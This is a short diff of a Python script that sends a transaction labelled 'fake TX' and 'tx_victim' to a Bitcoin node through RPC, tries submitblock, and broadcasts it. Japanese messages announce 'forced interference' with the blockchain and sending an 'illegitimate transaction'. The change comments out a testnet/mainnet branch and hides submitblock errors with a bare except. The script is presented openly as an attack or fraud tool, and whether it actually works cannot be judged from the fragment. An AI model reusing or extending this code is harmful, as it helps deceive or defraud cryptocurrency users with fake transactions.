@@ -132,15 +132,18 @@ print("OK")
 print("Send fake TX...")
 
 input(" --- Press enter key... --- ")
-rpc_node.sendrawtransaction(tx_victim, testnet)
-if testnet:
-    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.testnet.pubaddr1} '[\"{tx_victim}\"]' false")
-else:
-    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.mainnet.pubaddr1} '[\"{tx_victim}\"]' false")
+rpc_node.sendrawtransaction(tx_victim)
+#if testnet:
+#    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.testnet.pubaddr1} '[\"{tx_victim}\"]' false")
+#else:
+#    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.mainnet.pubaddr1} '[\"{tx_victim}\"]' false")
 print()
 print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
 print()
-result = rpc_node.submitblock(tx_victim)
+try:
+    result = rpc_node.submitblock(tx_victim)
+except:
+    pass
 print()
 broadcast_transaction(tx_victim, testnet)
 print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
